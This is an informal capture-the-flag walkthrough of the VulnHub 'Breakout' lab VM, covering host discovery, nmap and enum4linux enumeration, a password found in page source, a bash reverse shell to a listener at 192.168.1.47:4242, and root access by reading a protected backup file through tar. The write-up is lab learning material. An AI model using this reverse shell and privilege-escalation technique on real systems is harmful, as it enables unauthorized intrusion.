Get breakout zip from vulnhub and convert the image to utm image i.e 
# qemu-img convert -p -O qcow2 Breakout-dis1.vmdk Breakout-dis1.qcow2
creat a new virtual machine (emulate) without ISO image boot and then
mount this drive and uncheck UEFI boot option in qemu image. For networking i kept Bridged network. 
Lets start hacking
Disover Ip address: 
# sudo netdiscover
take the IP and scan all ports It 		
i.e # sudo nmap -p- -A -T 4 192.168.1.48
found out open ports. following the tutorial  by Techno science.
# enum4linux -a 192.168.1.48   .. gives us user name of http server
password for one webserver was found in the source code debian page.
 there was login shell where we placed reverse shell to our machine like. 
# bash -i >& /dev/tcp/192.168.1.47/4242 0>&1  but before that in our machine executed 
#nc -lvnp 4242 .
this connects the shell.  now we can search the system easily. 
in /var/backups there was the root passwords which was not readable. 
so putting up that in tar as it has access and then reading back gaves us the root password and then we could easily do su root.
